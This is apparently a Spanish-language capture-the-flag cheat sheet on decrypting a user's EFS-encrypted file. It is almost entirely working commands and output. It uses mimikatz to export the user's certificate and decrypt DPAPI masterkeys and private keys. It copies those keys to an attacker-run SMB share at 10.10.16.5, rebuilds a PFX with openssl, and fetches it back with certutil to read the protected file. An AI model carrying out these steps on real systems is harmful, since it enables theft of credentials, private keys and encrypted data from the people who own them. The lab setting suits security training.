
**DESCIFRAR ARCHIVO CON CREDENCIALES CON DE USUARIO PROPIERARIO (MIMIKATZ) (EFS)**
```shell
PS C:\Users\tolu\Desktop> cipher user.txt
	[IMPORTANT DATA] Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29
		-> 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29
		
PS C:\Users\tolu\Desktop> cd AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\
PS C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates> ls
		-> 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 #TIENE QUE HABER UN ARCHIVO CON EL MISMO NOMBRE QUE HEMOS VISTO ANTERIORMENTE.

[VOLVER AL DIRECTORIO DONDE ESTABA EL MIMIKATZ]
PS C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates> cd C:\ProgramData 

PS C:\ProgramData> .\mimikatz.exe "crypto::system /file:C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29 /export" "exit"
Saved to file: 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der

[TRANSFER]
❯ sudo impacket-smbserver smbFolder $(pwd) -smb2support -username gorka -password gorka123
net use x: \\10.10.16.5\smbFolder /user:gorka gorka123

PS C:\ProgramData> net use x: \\10.10.16.5\smbFolder /user:gorka gorka123
The command completed successfully.

PS C:\ProgramData> copy 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der x:\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der

[FIND PARAMETERS]
PS C:\ProgramData> cd C:\Users\tolu\AppData\Roaming\Microsoft\Protect
PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect> ls
	S-1-5-21-3107372852-1132949149-763516304-1011

PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect> dir S-1-5-21-3107372852-1132949149-763516304-1011 -Force
	2f452fc5-c6d2-4706-a4f7-1cd6b891c017

[FIND SHA1]
PS C:\Users\tolu\AppData\Roaming\Microsoft\Protect> cd C:\ProgramData

PS C:\ProgramData> .\mimikatz.exe "dpapi::masterkey /in:C:\Users\tolu\AppData\Roaming\Microsoft\Protect\S-1-5-21-3107372852-1132949149-763516304-1011\2f452fc5-c6d2-4706-a4f7-1cd6b891c017 /password:!zaq1234567890pl!99" "exit"
	sha1: 8ece5985210c26ecf3dd9c53a38fc58478100ccb

[FIND PRIVATE KEY]
PS C:\ProgramData> dir C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\
	S-1-5-21-3107372852-1132949149-763516304-1011
PS C:\ProgramData> dir C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011
	307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85
	
	[EN MASTERKEY PONER EL SHA1]
PS C:\ProgramData> .\mimikatz.exe "dpapi::capi /in:C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85 /masterkey:8ece5985210c26ecf3dd9c53a38fc58478100ccb" "exit"
PS C:\ProgramData> ls
	dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk
PS C:\ProgramData> copy dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk x:\dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk

[MAKE PUBLIC KEY]
❯ openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem

[MAKE PRIVATE KEY]
❯ openssl rsa -inform PVK -outform PEM -in dpapi_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.keyx.rsa.pvk -out private.pem

[CREATE PFX FILE]
❯ openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

[UPLOAD PFX TO MACHINE]
❯ sudo python3 -m http.server 80
PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.5/cert.pfx

[IMPORT CERTIFICATE]
PS C:\ProgramData> certutil -user -p mimikatz -importpfx cert.pfx NoChain,NoRoot
Certificate "tolu" added to store.

CertUtil: -importPFX command completed successfully.


[GET USER.TXT EF IN MY SITUATION]
PS C:\ProgramData> type C:\Users\tolu\Desktop\user.txt
0d522fa8d6d2671636ac7e73216808d3
```
